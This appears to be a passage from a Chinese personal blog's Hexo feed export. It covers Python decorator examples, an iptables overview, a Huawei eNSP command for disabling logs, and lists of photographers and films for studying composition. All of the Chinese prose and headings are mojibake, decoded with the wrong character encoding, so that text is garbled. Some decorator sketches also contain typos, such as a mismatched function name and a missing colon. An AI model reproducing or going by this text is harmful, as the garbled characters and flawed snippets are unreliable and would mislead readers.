class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">c, d</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func, args: &quot;</span>, c, d)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span></code></pre></div></div><p>ç­‰æ•ˆäº</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(func)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span></code></pre></div></div><h2 id="ä½¿ç”¨yield"><a href="#ä½¿ç”¨yield" class="headerlink" title="ä½¿ç”¨yield"></a>ä½¿ç”¨yield</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first_wrapper method&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first method args: &quot;</span>, a, b)</span><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> func(*args, **kwargs):</span><span class="line">                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sum: &quot;</span>, i)</span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> _</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">c, d</span>):</span></span><span class="line">    <span class="hljs-keyword">yield</span> <span class="hljs-built_in">sum</span>((c, d))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;== start program ==&quot;</span>)</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#init first_wrapper method</span></span><span class="line"><span class="hljs-comment">#== start program ==</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#first method args:  1 2</span></span><span class="line"><span class="hljs-comment">#sum:  7</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><h2 id="ç±»æ–¹æ³•è£…é¥°å™¨"><a href="#ç±»æ–¹æ³•è£…é¥°å™¨" class="headerlink" title="ç±»æ–¹æ³•è£…é¥°å™¨"></a>ç±»æ–¹æ³•è£…é¥°å™¨</h2><h3 id="åŒä¸€ä¸ªç±»ä¸­ï¼Œæ–¹æ³•ä½¿ç”¨è£…é¥°å™¨"><a href="#åŒä¸€ä¸ªç±»ä¸­ï¼Œæ–¹æ³•ä½¿ç”¨è£…é¥°å™¨" class="headerlink" title="åŒä¸€ä¸ªç±»ä¸­ï¼Œæ–¹æ³•ä½¿ç”¨è£…é¥°å™¨"></a>åŒä¸€ä¸ªç±»ä¸­ï¼Œæ–¹æ³•ä½¿ç”¨è£…é¥°å™¨</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connect</span>():</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_conn</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;æ£€æŸ¥è¿æ¥çŠ¶æ€&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span></span><span class="line">            <span class="hljs-keyword">if</span> self.is_connected():</span><span class="line">                <span class="hljs-keyword">return</span> func(self, *args, **kwargs)</span><span class="line">            <span class="hljs-keyword">else</span>:</span><span class="line">                <span class="hljs-keyword">raise</span> ConnectException(<span class="hljs-string">&quot;Not connected&quot;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @check_conn</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">disconnect</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.handle.disconnect(self.conn)</span><span class="line">        self.conn = <span class="hljs-literal">None</span></span></code></pre></div></div><h3 id="åœ¨ç±»å¤–ä½¿ç”¨ç±»ä¸­è£…é¥°å™¨"><a href="#åœ¨ç±»å¤–ä½¿ç”¨ç±»ä¸­è£…é¥°å™¨" class="headerlink" title="åœ¨ç±»å¤–ä½¿ç”¨ç±»ä¸­è£…é¥°å™¨"></a>åœ¨ç±»å¤–ä½¿ç”¨ç±»ä¸­è£…é¥°å™¨</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Before</span>():</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">command</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wapper</span>(<span class="hljs-params">f</span>):</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;command before&#x27;</span>)</span><span class="line">            <span class="hljs-keyword">return</span> f</span><span class="line">        <span class="hljs-keyword">return</span> wapper</span><span class="line"></br></span><span class="line"></br></span><span class="line">app = Before()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@app.command()</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">hello()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#command before</span></span><span class="line"><span class="hljs-comment">#hello</span></span></code></pre></div></div><h2 id="ä½¿ç”¨-call-é­”æ³•æ–¹æ³•è§¦å‘è£…é¥°å™¨"><a href="#ä½¿ç”¨-call-é­”æ³•æ–¹æ³•è§¦å‘è£…é¥°å™¨" class="headerlink" title="ä½¿ç”¨__call__é­”æ³•æ–¹æ³•è§¦å‘è£…é¥°å™¨"></a>ä½¿ç”¨<code>__call__</code>é­”æ³•æ–¹æ³•è§¦å‘è£…é¥°å™¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDecorator</span>:</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, func</span>):</span></span><span class="line">        self.func = func</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--- checking ---&quot;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> self.func(*args, **kwargs)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@MyDecorator</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_2019_nCov</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name&#125;</span> is very healty&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    check_2019_nCov(<span class="hljs-string">&quot;youge&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output</span></span><span class="line">--- checking ---</span><span class="line">youge <span class="hljs-keyword">is</span> very healty</span></code></pre></div></div><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è£…é¥°å™¨ä¸å¸¦å‚æ•°çš„åŸºæœ¬å‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-comment"># do some decorator init</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fun_main</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">        ...</span><span class="line">        func(*args, **kwargs)</span><span class="line">        ...</span><span class="line">    <span class="hljs-keyword">return</span> func_main</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@decorator</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">*args, **kwargs</span>):</span></span><span class="line">    ...</span><span class="line"></br></span><span class="line">func(a, b)</span><span class="line"><span class="hljs-comment"># ç­‰æ•ˆäº</span></span><span class="line">decorator(func)(a, b)</span></code></pre></div></div><p>è£…é¥°å™¨å¸¦å‚æ•°çš„åŸºæœ¬å‹:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">*dec_args, **dec_kwargs</span>):</span></span><span class="line">    <span class="hljs-comment"># do some decorator init</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func_init</span>(<span class="hljs-params">func</span>):</span></span><span class="line">        <span class="hljs-comment"># do some func init</span></span><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func_main</span>(<span class="hljs-params">*func_args, **func_kwargs</span>)</span></span><span class="line"><span class="hljs-function">            ...</span></span><span class="line"><span class="hljs-function">            <span class="hljs-title">func</span>(<span class="hljs-params">*func_args, **func_kwargs</span>)</span></span><span class="line"><span class="hljs-function">            ...</span></span><span class="line"><span class="hljs-function">        <span class="hljs-title">return</span> <span class="hljs-title">func_main</span></span></span><span class="line"><span class="hljs-function">    <span class="hljs-title">return</span> <span class="hljs-title">func_init</span></span></span><span class="line"></br></span><span class="line"><span class="hljs-function">@<span class="hljs-title">decorator</span>(<span class="hljs-params">a, b</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-title">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">*func_args, **func_kwargs</span>):</span></span><span class="line">    ...</span><span class="line"></br></span><span class="line">func(c, d)</span><span class="line"><span class="hljs-comment"># ç­‰æ•ˆäº</span></span><span class="line">decorator(a, b)(func)(c, d)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptable é˜²ç«å¢™</title>
      <link href="/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>iptable å…¶å®æ˜¯netfilterçš„å¯¹å¤–æ¥å£ï¼Œå†…æ ¸é˜²ç«å¢™å…¶å®æ˜¯netfilter</p><p>iptable æœ‰é“¾å’Œè¡¨çš„æ¦‚å¿µï¼Œè¿˜æœ‰åŒ…å¤„äºä»€ä¹ˆä½ç½®</p><p><img src="/2021/08/20/iptable-%E9%98%B2%E7%81%AB%E5%A2%99/1.png"></p><p>è¿™å°±æ˜¯iptableçš„è¿è¡Œå›¾ï¼Œæœ‰5ä¸ªé“¾ï¼š<br><code>prerouting</code> <code>forwording</code> <code>postrouting</code> <code>input</code> <code>output</code></p><p>æœ‰4ä¸ªåŸºæœ¬è¡¨ï¼š<br><code>raw</code> <code>mangle</code> <code>nat</code> <code>filter</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line"><span class="hljs-attribute">filter</span>è¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</span><span class="line"></br></span><span class="line">natè¡¨ï¼šnetwork <span class="hljs-selector-tag">address</span> translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat</span><span class="line"></br></span><span class="line">mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle</span><span class="line"></br></span><span class="line">rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw</span></code></pre></div></div><h3 id="åŒ¹é…è§„åˆ™"><a href="#åŒ¹é…è§„åˆ™" class="headerlink" title="åŒ¹é…è§„åˆ™"></a>åŒ¹é…è§„åˆ™</h3><p>åŒ¹é…è§„åˆ™åˆ†ä¸ºæ ‡å‡†åŒ¹é…å’Œæ‰©å±•åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŸºäºIPå’ŒåŸºäºç«¯å£çš„åŒ¹é…</p><h3 id="åŠ¨ä½œ"><a href="#åŠ¨ä½œ" class="headerlink" title="åŠ¨ä½œ"></a>åŠ¨ä½œ</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">DROP</span>ï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</span><span class="line"></br></span><span class="line">REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</span><span class="line"></br></span><span class="line">SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</span><span class="line"></br></span><span class="line">MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚</span><span class="line"></br></span><span class="line">DNATï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</span><span class="line"></br></span><span class="line">REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">LOG</span>ï¼šåœ¨/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</span></code></pre></div></div><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><ul><li><p>æŸ¥çœ‹</p><ul><li><code>iptables -L</code> é»˜è®¤å°±æ˜¯æŸ¥çœ‹filter è¡¨çš„ INPUT é“¾</li><li><code>iptables -nvL INPUT --line-numbers</code>  æŸ¥çœ‹è¯¦æƒ…</li></ul></li><li><p><a href="http://blog.51yip.com/linux/1404.html">è¿™é‡Œ</a>æ˜¯iptables çš„å¢åˆ æ”¹æŸ¥å‘½ä»¤</p></li></ul><p>æ¸…é™¤è®¡æ•°ä¸º<code>-Z</code></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åä¸ºeNSP å…³é—­Log</title>
      <link href="/2021/08/17/%E5%8D%8E%E4%B8%BAeNSP-%E5%85%B3%E9%97%ADLog/"/>
      <url>/2021/08/17/%E5%8D%8E%E4%B8%BAeNSP-%E5%85%B3%E9%97%ADLog/</url>
      
        <content type="html"><![CDATA[<p>åä¸ºçš„æ¨¡æ‹Ÿå™¨<code>eNSP</code>é»˜è®¤å¯¹å˜æ›´ä¼šæœ‰Logäº§ç”Ÿï¼Œéå¸¸å½±å“æ“ä½œã€‚å…³é—­çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pf codeBlockLines"><span class="line">info-center source DS channel <span class="hljs-number">0</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">state</span> off  trap <span class="hljs-keyword">state</span> off</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»˜ç”»æœ€é€‚åˆå­¦ä¹ çš„æ„å›¾å’Œå…‰å½±çš„ç”µå½±</title>
      <link href="/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/"/>
      <url>/2021/08/11/%E7%BB%98%E7%94%BB%E6%9C%80%E9%80%82%E5%90%88%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9E%84%E5%9B%BE%E5%92%8C%E5%85%89%E5%BD%B1%E7%9A%84%E7%94%B5%E5%BD%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="æœ€å€¼å¾—ç»˜ç”»äººå­¦ä¹ çš„æ‘„å½±å¤§ç¥"><a href="#æœ€å€¼å¾—ç»˜ç”»äººå­¦ä¹ çš„æ‘„å½±å¤§ç¥" class="headerlink" title="æœ€å€¼å¾—ç»˜ç”»äººå­¦ä¹ çš„æ‘„å½±å¤§ç¥"></a>æœ€å€¼å¾—ç»˜ç”»äººå­¦ä¹ çš„æ‘„å½±å¤§ç¥</h2><p>Henri Cartier-Bresson   çºªå®æ‘„å½±æœ€é«˜å³°ï¼Œå†³å®šæ€§çš„ç¬é—´</p><p>W.Eugene Smith  è¿ç»­æ‘„å½±çºªå®å¤©æ‰ï¼Œæ„å›¾å®Œç¾å‡ ä¹æ— åŠ£ä½œ</p><p>Jacques Henri Lartigue  åŠ¨æ€æ„Ÿ</p><p>Elliott Erwitt äººç‰©è¡—æ‹å¤§å¸ˆ</p><p>Mark Cohen  è¡—å¤´å·æ‹å˜æ€</p><p>è’æœ¨ç»æƒŸ    æ’¸çŒ«çš„å˜æ€</p><p>å±±æœ¬æ˜Œç”·    å°å°ºå¯¸æ„å›¾å·¨åŒ </p><p>æ£®å±±å¤§é“    é»‘ç™½è¡—æ‹</p><p>èœ·å·å®èŠ±   è‰³ä¸½è‰²å½©</p><p>Josef Koudelka   æ„å›¾å¯“æ„å¤§ç¥</p><p>Arnold Newman  ä¸“æ‹å¤§å¸ˆè‚–åƒ</p><p>Robert Capa  æˆ˜åœ°çºªå®</p><p>Irving Penn  æ—¶å°šå’Œæ„å›¾ï¼Œvogueé£</p><p>Vivian Maier  æ‘„å½±å¤©èµ‹çš„ä¿å§†</p><p>Steve McCurry  ã€Šå›½å®¶åœ°ç†ã€‹é¦–å¸­æ‘„å½±</p><p>Ansel Adams  é»‘ç™½é£æ™¯æ„å›¾</p><p>Helen Levitt   å½©è‰²è¡—å¤´æ‘„å½±</p><p>Pete Turner   è‰²å½©æ„å›¾å¿…å­¦</p><p>Robert Frank  è®°å½•ç¾å›½ç”Ÿæ´»</p><p>Saul Leiter   æ„å¢ƒç‰¹å†™ï¼Œæœ¦èƒ§äººç‰©</p><p>Harry Callahan   çº¿æ¡ï¼ŒæŠ½è±¡</p><p>Ernst Haas   è‰²å½©å’Œåˆ›æ„æ„å›¾</p><p>Fred Herzog   ç”µå½±è‰²å½©</p><p>Stephen Shore    è‰²å½©ç©ºé—´æ„æˆ</p><p>Platon  å¤§é€è§†ï¼Œè‚–åƒæ‘„å½±ç‹</p><p>Annie Leibovitz   çº¦ç¨¿ä»·æœ€é«˜åäººæ‘„å½±</p><p>Joel Meyerowitz  å½©è‰²æ‘„å½±å…ˆé”‹</p><h2 id="å²ä¸Šæœ€é€‚åˆå­¦ä¹ æ„å›¾å’Œå…‰å½±è‰²å½©çš„ç”µå½±"><a href="#å²ä¸Šæœ€é€‚åˆå­¦ä¹ æ„å›¾å’Œå…‰å½±è‰²å½©çš„ç”µå½±" class="headerlink" title="å²ä¸Šæœ€é€‚åˆå­¦ä¹ æ„å›¾å’Œå…‰å½±è‰²å½©çš„ç”µå½±"></a>å²ä¸Šæœ€é€‚åˆå­¦ä¹ æ„å›¾å’Œå…‰å½±è‰²å½©çš„ç”µå½±</h2><p>ã€ŠThe Grand Budapest Hotel ï¼ˆå¸ƒè¾¾ä½©æ–¯å¤§é¥­åº—ï¼‰ã€‹</p><p>ã€ŠMoonrise Kingdom ï¼ˆæœˆäº®å‡èµ·ä¹‹ç‹å›½ï¼‰ã€‹</p><p>ã€ŠMad Max: Fury Road ï¼ˆç–¯ç‹‚çš„éº¦å…‹æ–¯4ï¼šç‹‚æš´ä¹‹è·¯ï¼‰ã€‹</p><p>ã€ŠWhat Dreams May Come ï¼ˆç¾æ¢¦æˆçœŸï¼‰ã€‹</p><p>ã€ŠGravity ï¼ˆåœ°å¿ƒå¼•åŠ›ï¼‰ã€‹</p><p>ã€ŠInterstellarï¼ˆæ˜Ÿé™…ç©¿è¶Šï¼‰ã€‹</p><p>ã€ŠLife Of Pi ï¼ˆå°‘å¹´æ´¾çš„å¥‡å¹»æ¼‚æµï¼‰ã€‹</p><p>ã€ŠThe Fallï¼ˆå å…¥ï¼‰ã€‹</p><p>ã€Šã•ãã‚‰ã‚“ ï¼ˆèŠ±é­ï¼‰ã€‹</p><p>ã€Šãƒªãƒˆãƒ«ãƒ»ãƒ•ã‚©ãƒ¬ã‚¹ãƒˆ å°æ£®æ—ã€‹ï¼ˆ2014ï¼Œ2015ï¼‰</p><p>ã€ŠèŠ±æ ·å¹´åã€‹</p><p>ã€Š2046ã€‹</p><p>ã€ŠåŠ›ç‹ã€‹</p><p>ã€ŠVolver ï¼ˆå›å½’ï¼‰ã€‹</p><p>ã€ŠParis, Texas ï¼ˆå¾·å·å·´é»ï¼‰ã€‹</p><p>ã€ŠEquilibrium ï¼ˆæ’•è£‚çš„æœ«æ—¥ï¼‰ã€‹</p><p>ã€ŠThe Revenant ï¼ˆè’é‡çŒäººï¼‰ã€‹</p><p>ã€ŠThe Tree of Life ï¼ˆç”Ÿå‘½ä¹‹æ ‘ï¼‰ã€‹</p><p>ã€Š007 Skyfall ï¼ˆ007å¤§ç ´å¤©å¹•æ€æœºï¼‰ã€‹</p><p>ã€ŠBatman Dark Knightï¼ˆè™è ä¾ é»‘æš—éª‘å£«ï¼‰ã€‹(2008ï¼Œ2012)</p><p>ã€ŠEn la ciudad de Sylviaåœ¨å¸Œå°”ç»´äºšåŸä¸­ ã€‹</p><p>ã€ŠInceptionï¼ˆç›—æ¢¦ç©ºé—´ï¼‰ã€‹</p><p>ã€ŠThe Matrixï¼ˆé»‘å®¢å¸å›½ï¼‰ã€‹</p><p>ã€ŠAlice in Wonderland ï¼ˆçˆ±ä¸½ä¸æ¢¦æ¸¸ä»™å¢ƒï¼‰ã€‹ï¼ˆ2010ï¼‰</p><p>ã€ŠIndependence Dayï¼ˆç‹¬ç«‹æ—¥ï¼‰ã€‹</p><p>ã€ŠPrometheus ï¼ˆæ™®ç½—ç±³ä¿®æ–¯ï¼‰ã€‹</p><p>ã€ŠWatchmen ï¼ˆå®ˆæœ›è€…ï¼‰ã€‹</p><p>ã€ŠPerfume: The Story of a Murdererï¼ˆé¦™æ°´ï¼‰ã€‹</p><p>ã€Š2001: A Space Odyssey ï¼ˆ2001å¤ªç©ºæ¼«æ¸¸ 2001ï¼‰ã€‹</p><p>ã€ŠGladiator ï¼ˆè§’æ–—å£«ï¼‰ã€‹</p><p>ã€ŠLeap Year ï¼ˆé—°å¹´ ï¼‰ã€‹</p><p>ã€ŠArtificial Intelligence: AI ï¼ˆäººå·¥æ™ºèƒ½ï¼‰ã€‹</p><p>ã€ŠSuper man Man of Steel ï¼ˆè¶…äººï¼šé’¢é“ä¹‹èº¯ï¼‰ã€‹</p><p>ã€ŠReal Steelï¼ˆé“ç”²é’¢æ‹³ ï¼‰ã€‹</p><p>ã€ŠThe Nightmare Before Christmas ï¼ˆåœ£è¯å¤œæƒŠé­‚ï¼‰ã€‹</p><p>ã€ŠÃ†on Flux é­”åŠ›å¥³æˆ˜å£«ã€‹</p><p>ã€ŠKing Kong ï¼ˆé‡‘åˆšï¼‰ã€‹ï¼ˆ2005ï¼‰</p><p>ã€ŠJoker ï¼ˆå°ä¸‘ï¼‰ã€‹ï¼ˆ2019ï¼‰</p><p>ã€ŠSucker Punchï¼ˆç¾å°‘å¥³ç‰¹æ”»é˜Ÿï¼‰ã€‹</p><p>ã€Š300 (æ–¯å·´è¾¾300å‹‡å£«) ã€‹(2006)</p><p>ã€ŠSin City (ç½ªæ¶ä¹‹åŸ)ã€‹(2005)</p><p>ã€ŠGhost in Shell (æ”»å£³æœºåŠ¨é˜Ÿ)ã€‹(2017)</p><p>ã€ŠBlade Runner ï¼ˆé“¶ç¿¼æ€æ‰‹ï¼‰ã€‹ï¼ˆ1982ï¼Œ2017ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»˜ç”»é˜¶æ®µæ—¶é—´åˆ†é…</title>
      <link href="/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/"/>
      <url>/2021/08/11/%E7%BB%98%E7%94%BB%E9%98%B6%E6%AE%B5%E6%97%B6%E9%97%B4%E5%88%86%E9%85%8D/</url>
      
